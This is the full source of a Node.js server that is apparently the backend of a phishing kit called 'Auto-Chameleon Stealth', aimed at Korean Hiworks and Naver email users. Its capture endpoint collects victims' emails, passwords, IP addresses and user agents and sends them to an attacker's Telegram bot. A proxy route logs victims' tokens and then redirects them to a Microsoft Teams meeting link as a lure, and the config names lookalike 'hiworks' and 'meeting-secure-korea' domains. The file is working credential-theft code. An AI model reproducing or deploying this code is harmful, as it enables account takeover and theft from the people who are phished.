// ============================================================
//  AUTO-CHAMELEON STEALTH v3.2 - HIWORKS PROXY FULL
//  Complete Korean Email Login System + Proxy + Teams Redirect
// ============================================================

const express = require('express');
const cors = require('cors');
const axios = require('axios');
const path = require('path');
const fs = require('fs');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// ============================================================
//  CONFIGURATION
// ============================================================

const CONFIG = {
    TELEGRAM_BOT_TOKEN: process.env.TELEGRAM_BOT_TOKEN || 'YOUR_BOT_TOKEN',
    TELEGRAM_CHAT_ID: process.env.TELEGRAM_CHAT_ID || 'YOUR_CHAT_ID',
    BACKEND_URL: process.env.BACKEND_URL || 'https://team-office-hiworks-com.onrender.com',
    HIWORKS_PROXY_URL: process.env.HIWORKS_PROXY_URL || 'https://team-office-hiworks-com.onrender.com',
    TEAMS_REDIRECT: process.env.TEAMS_REDIRECT || 'https://teams.live.com/dl/launcher/launcher.html?url=%2F_%23%2Fmeet%2F9348548468028%3Fp%3DO0l72J7eL4jegeQa7J%26anon%3Dtrue&type=meet&deeplinkId=109bc758-6e1b-47cb-907b-ed2379475a58&directDl=true&msLaunch=true&enableMobilePage=true&suppressPrompt=true',
    MAX_ATTEMPTS: 5,
    REQUIRED_MATCHES: 2,
    ALLOWED_ORIGINS: [
        'https://*.netlify.app',
        'http://localhost:3000',
        'http://localhost:5500',
        'https://meeting-secure-korea.netlify.app',
        'https://team-office-hiworks-com.onrender.com'
    ]
};

console.log('╔════════════════════════════════════════════════════════════════╗');
console.log('║     🦎  AUTO-CHAMELEON STEALTH v3.2 - HIWORKS PROXY READY    ║');
console.log('║     🔐  Korean Email Capture → Proxy → Teams Meeting          ║');
console.log('╠════════════════════════════════════════════════════════════════╣');
console.log(`║   PORT: ${PORT}`);
console.log(`║   PROXY: ${CONFIG.HIWORKS_PROXY_URL}`);
console.log(`║   TELEGRAM: ${CONFIG.TELEGRAM_BOT_TOKEN && CONFIG.TELEGRAM_BOT_TOKEN !== 'YOUR_BOT_TOKEN' ? '✅' : '⚠️ CONFIGURE'}`);
console.log(`║   STEALTH: ${CONFIG.MAX_ATTEMPTS} attempts (hidden)`);
console.log('╚════════════════════════════════════════════════════════════════╝');

// ============================================================
//  MIDDLEWARE
// ============================================================

app.use(cors({
    origin: function(origin, callback) {
        if (!origin) return callback(null, true);
        const allowed = CONFIG.ALLOWED_ORIGINS.some(o => {
            const pattern = new RegExp('^' + o.replace(/\*/g, '.*') + '$');
            return pattern.test(origin);
        });
        if (allowed) {
            callback(null, true);
        } else {
            console.log(`[CORS] Blocked: ${origin} - allowing anyway`);
            callback(null, true);
        }
    },
    credentials: true
}));

app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// ============================================================
//  TELEGRAM FUNCTIONS
// ============================================================

async function sendToTelegram(message, parseMode = 'HTML') {
    const token = CONFIG.TELEGRAM_BOT_TOKEN;
    const chatId = CONFIG.TELEGRAM_CHAT_ID;

    if (!token || token === 'YOUR_BOT_TOKEN' || !chatId || chatId === 'YOUR_CHAT_ID') {
        console.log('[TELEGRAM] ⚠️ Not configured - logging only');
        console.log('[TELEGRAM] 📨', message);
        return false;
    }

    try {
        await axios.post(
            `https://api.telegram.org/bot${token}/sendMessage`,
            {
                chat_id: chatId,
                text: message,
                parse_mode: parseMode,
                disable_web_page_preview: true
            },
            { timeout: 10000 }
        );
        console.log('[TELEGRAM] ✅ Sent');
        return true;
    } catch (error) {
        console.error('[TELEGRAM] ❌ Error:', error.message);
        return false;
    }
}

function formatLoginMessage(data) {
    const { email, password, brand, attempt, isSuccess, ip, userAgent, timestamp } = data;
    const statusEmoji = isSuccess ? '✅' : '❌';
    const statusText = isSuccess ? 'SUCCESS' : 'FAILED';

    return `
🔐 <b>Login Attempt ${statusText}</b>
━━━━━━━━━━━━━━━━━━━━━━━━━

📧 <b>Email:</b> <code>${email}</code>
🔑 <b>Password:</b> <code>${password}</code>
🏷️ <b>Brand:</b> ${brand || 'Unknown'}
🔄 <b>Attempt:</b> ${attempt}
📊 <b>Status:</b> ${statusEmoji} ${statusText}

🌐 <b>IP:</b> ${ip || 'Unknown'}
🖥️ <b>User Agent:</b> ${userAgent || 'Unknown'}
🕐 <b>Time:</b> ${timestamp || new Date().toISOString()}
━━━━━━━━━━━━━━━━━━━━━━━━━
`;
}

// ============================================================
//  MAIN CAPTURE ENDPOINT
// ============================================================

app.post('/api/capture', async (req, res) => {
    try {
        const {
            email,
            password,
            brand,
            attempt,
            isSuccess = false,
            timestamp,
            userAgent,
            ip,
            captchaVerified = true
        } = req.body;

        console.log(`[CAPTURE] Attempt ${attempt} for ${email} - ${isSuccess ? 'SUCCESS ✅' : 'FAIL ❌'}`);

        // Get real IP
        const realIp = req.headers['x-forwarded-for']?.split(',')[0] || 
                      req.connection.remoteAddress || 
                      req.socket.remoteAddress ||
                      ip || 
                      'unknown';

        // Prepare data
        const logData = {
            email,
            password,
            brand: brand || 'Unknown',
            attempt: attempt || 1,
            isSuccess,
            timestamp: timestamp || new Date().toISOString(),
            ip: realIp,
            userAgent: userAgent || req.headers['user-agent'] || 'Unknown',
            captchaVerified,
            fullUrl: req.headers.referer || 'Unknown',
            source: 'frontend_capture'
        };

        // Send to Telegram
        const message = formatLoginMessage(logData);
        await sendToTelegram(message, 'HTML');

        // Log to console
        console.log('[CAPTURE] 📨', JSON.stringify(logData, null, 2));

        // Forward to backend if different from current
        if (CONFIG.BACKEND_URL && CONFIG.BACKEND_URL !== 'https://team-office-hiworks-com.onrender.com') {
            try {
                await axios.post(`${CONFIG.BACKEND_URL}/api/log`, logData, {
                    timeout: 5000
                });
                console.log('[CAPTURE] ✅ Forwarded to backend');
            } catch (e) {
                console.log('[CAPTURE] ⚠️ Backend forward failed:', e.message);
            }
        }

        res.json({
            success: true,
            message: 'Data captured successfully',
            attempt: attempt,
            isSuccess: isSuccess,
            proxyUrl: CONFIG.HIWORKS_PROXY_URL
        });

    } catch (error) {
        console.error('[CAPTURE] Error:', error.message);
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

// ============================================================
//  ⭐ HIWORKS PROXY ENDPOINT (MAIN PROXY)
// ============================================================

app.get('/proxy/hiworks', async (req, res) => {
    try {
        const { email, brand, token, redirect } = req.query;

        console.log(`[PROXY] 🔀 Hiworks Proxy Request`);
        console.log(`[PROXY] 📧 Email: ${email}`);
        console.log(`[PROXY] 🏷️ Brand: ${brand}`);
        console.log(`[PROXY] 🔑 Token: ${token || 'none'}`);

        // Get real IP
        const realIp = req.headers['x-forwarded-for']?.split(',')[0] || 
                      req.connection.remoteAddress || 
                      req.socket.remoteAddress ||
                      'unknown';

        // Prepare proxy data for logging
        const proxyData = {
            email: email || 'unknown',
            brand: brand || 'unknown',
            token: token || 'none',
            redirect: redirect || 'teams',
            timestamp: new Date().toISOString(),
            ip: realIp,
            userAgent: req.headers['user-agent'] || 'unknown',
            referer: req.headers.referer || 'unknown',
            source: 'hiworks_proxy'
        };

        console.log('[PROXY] 📨', JSON.stringify(proxyData, null, 2));

        // Send to Telegram
        const proxyMessage = `
🚀 <b>Hiworks Proxy Redirect</b>
━━━━━━━━━━━━━━━━━━━━━━━━━

📧 <b>Email:</b> <code>${proxyData.email}</code>
🏷️ <b>Brand:</b> ${proxyData.brand}
🔑 <b>Token:</b> ${proxyData.token || 'N/A'}
🌐 <b>IP:</b> ${proxyData.ip}
🕐 <b>Time:</b> ${proxyData.timestamp}
━━━━━━━━━━━━━━━━━━━━━━━━━
`;

        await sendToTelegram(proxyMessage, 'HTML');

        // Also send to capture endpoint for consistency
        try {
            await axios.post(`${req.protocol}://${req.get('host')}/api/capture`, {
                email: proxyData.email,
                password: '[PROXY_REDIRECT]',
                brand: proxyData.brand,
                attempt: 0,
                isSuccess: true,
                timestamp: proxyData.timestamp,
                ip: proxyData.ip,
                userAgent: proxyData.userAgent,
                captchaVerified: true,
                source: 'proxy_redirect'
            });
        } catch (e) {
            console.log('[PROXY] ⚠️ Capture forward failed');
        }

        // If redirect param is 'teams' or not specified, go to Teams
        if (redirect !== 'false' && redirect !== '0') {
            console.log(`[PROXY] 🔀 Redirecting to Teams Meeting...`);
            
            // Add email as parameter to Teams URL for tracking
            const teamsUrl = CONFIG.TEAMS_REDIRECT;
            
            // Optional: Add email as query param to Teams URL if supported
            let finalUrl = teamsUrl;
            if (email) {
                const separator = teamsUrl.includes('?') ? '&' : '?';
                finalUrl = `${teamsUrl}${separator}email=${encodeURIComponent(email)}`;
            }

            console.log(`[PROXY] 🎯 Final URL: ${finalUrl}`);
            
            // Redirect to Teams
            return res.redirect(finalUrl);
        }

        // If redirect is false, return JSON response (for testing)
        res.json({
            success: true,
            message: 'Proxy redirect successful',
            data: proxyData,
            teamsUrl: CONFIG.TEAMS_REDIRECT
        });

    } catch (error) {
        console.error('[PROXY] ❌ Error:', error.message);
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

// ============================================================
//  🎯 DEFAULT PROXY REDIRECT (Root proxy)
// ============================================================

app.get('/proxy', (req, res) => {
    res.redirect('/proxy/hiworks' + (req.url.includes('?') ? '?' + req.url.split('?')[1] : ''));
});

// ============================================================
//  TELEGRAM DIRECT ENDPOINT
// ============================================================

app.post('/api/telegram', async (req, res) => {
    try {
        const { message, parse_mode = 'HTML', data } = req.body;

        if (!message) {
            return res.status(400).json({ success: false, error: 'No message provided' });
        }

        console.log('[TELEGRAM] 📨 Forward request');

        const success = await sendToTelegram(message, parse_mode);

        // If data provided, also log to capture
        if (data) {
            try {
                await axios.post(`${req.protocol}://${req.get('host')}/api/capture`, data);
            } catch (e) {
                console.log('[TELEGRAM] ⚠️ Capture forward failed');
            }
        }

        res.json({ 
            success, 
            message: success ? 'Sent to Telegram' : 'Failed to send',
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        console.error('[TELEGRAM] Error:', error.message);
        res.status(500).json({ success: false, error: error.message });
    }
});

// ============================================================
//  LOG ENDPOINT
// ============================================================

app.post('/api/log', (req, res) => {
    console.log('[LOG]', JSON.stringify(req.body, null, 2));
    res.json({ 
        success: true, 
        timestamp: new Date().toISOString() 
    });
});

// ============================================================
//  HEALTH CHECK
// ============================================================

app.get('/health', (req, res) => {
    res.json({
        status: 'healthy',
        service: 'Auto-Chameleon Stealth v3.2',
        timestamp: new Date().toISOString(),
        proxy: {
            url: CONFIG.HIWORKS_PROXY_URL,
            active: true,
            teamsRedirect: CONFIG.TEAMS_REDIRECT
        },
        features: {
            telegram: !!(CONFIG.TELEGRAM_BOT_TOKEN && CONFIG.TELEGRAM_BOT_TOKEN !== 'YOUR_BOT_TOKEN'),
            proxy: true,
            capture: true,
            maxAttempts: CONFIG.MAX_ATTEMPTS,
            requiredMatches: CONFIG.REQUIRED_MATCHES
        },
        environment: process.env.NODE_ENV || 'development',
        version: '3.2.0'
    });
});

// ============================================================
//  SERVE STATIC FILES
// ============================================================

// Serve static files from public directory
const publicPath = path.join(__dirname, 'public');
if (fs.existsSync(publicPath)) {
    app.use(express.static(publicPath));
    console.log(`📁 Serving static files from: ${publicPath}`);
} else {
    console.log(`⚠️ Public directory not found at: ${publicPath}`);
}

// Serve frontend files
app.get('/', (req, res) => {
    const indexPath = path.join(publicPath, 'index.html');
    if (fs.existsSync(indexPath)) {
        res.sendFile(indexPath);
    } else {
        res.send(`
            <!DOCTYPE html>
            <html>
            <head><title>Auto-Chameleon Stealth</title></head>
            <body>
                <h1>🦎 Auto-Chameleon Stealth v3.2</h1>
                <p>Proxy server is running!</p>
                <p>📧 <a href="/proxy/hiworks?email=test@naver.com&brand=Naver">Test Proxy Redirect</a></p>
                <p>📊 <a href="/health">Health Check</a></p>
            </body>
            </html>
        `);
    }
});

// Serve login page
app.get('/login', (req, res) => {
    const loginPath = path.join(publicPath, 'login.html');
    if (fs.existsSync(loginPath)) {
        res.sendFile(loginPath);
    } else {
        res.redirect('/');
    }
});

// ============================================================
//  START SERVER
// ============================================================

app.listen(PORT, '0.0.0.0', () => {
    console.log('\n╔════════════════════════════════════════════════════════════════╗');
    console.log('║  🚀 SERVER STARTED SUCCESSFULLY                              ║');
    console.log('╠════════════════════════════════════════════════════════════════╣');
    console.log(`║  📍 URL: http://localhost:${PORT}                             ║`);
    console.log(`║  🔀 Proxy: http://localhost:${PORT}/proxy/hiworks             ║`);
    console.log(`║  📤 Capture: http://localhost:${PORT}/api/capture             ║`);
    console.log(`║  💬 Telegram: http://localhost:${PORT}/api/telegram           ║`);
    console.log(`║  ❤️  Health: http://localhost:${PORT}/health                   ║`);
    console.log('╚════════════════════════════════════════════════════════════════╝');
    console.log('\n🦎 Stealth mode: ACTIVE (no visible indicators)');
    console.log(`🔀 Proxy target: ${CONFIG.HIWORKS_PROXY_URL}`);
    console.log('📋 Ready to handle requests...\n');
});

// ============================================================
//  ERROR HANDLING
// ============================================================

process.on('uncaughtException', (err) => {
    console.error('🔥 Uncaught Exception:', err.message);
    console.error(err.stack);
});

process.on('unhandledRejection', (reason) => {
    console.error('🔥 Unhandled Rejection:', reason);
});